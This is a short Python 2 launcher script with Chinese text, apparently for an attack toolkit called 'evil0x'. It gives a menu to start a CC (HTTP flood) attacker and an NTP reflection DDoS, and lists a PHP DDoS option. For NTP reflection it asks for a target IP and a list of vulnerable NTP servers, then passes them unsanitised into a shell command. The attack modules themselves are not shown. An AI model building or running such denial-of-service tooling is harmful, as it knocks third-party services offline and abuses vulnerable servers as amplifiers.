# -*-coding:utf-8-*-
import subprocess
import sys
import os 
print """ *****************************************************
欢迎使用evil0x自有工具合集,工具创意均来自网上的安全信息,但是代码
自己编写所以具有一定安全保证,这里可以放心使用,有问题找YC        
******************************************************        """
while True:
	print "1 CC攻击器                       2  ntp反射ddos "
	print "3 PHP DDOS       4 退出"
	select = raw_input("选择你要使用到功能：")
	if select  == '1':
		subprocess.Popen("python tools1/cc/tools1_cc.py",shell=True)
		continue
	elif select =='2':
		print "ntp反射基于有漏洞到ntp服务器才有效，首先你必须有一份有漏洞到ntp服务器列表"
		select1=raw_input("请输入你到目标ip:")
		select2=raw_input("请输入你到服务器列表名，不在ntp路径下请保持绝对路径:")
		if select1 ==" " or select2 ==" ":
			print "错误的参数"
		else:
			cmd ="python tools1/ntp/ntp.py"+" "+select1+" "+select2
			print cmd
			subprocess.Popen(cmd,shell=True)
		continue
	elif select =='4':
		sys.exit()
	else:
		print "输入的选项有错误,重新选择"
		continue
		
	
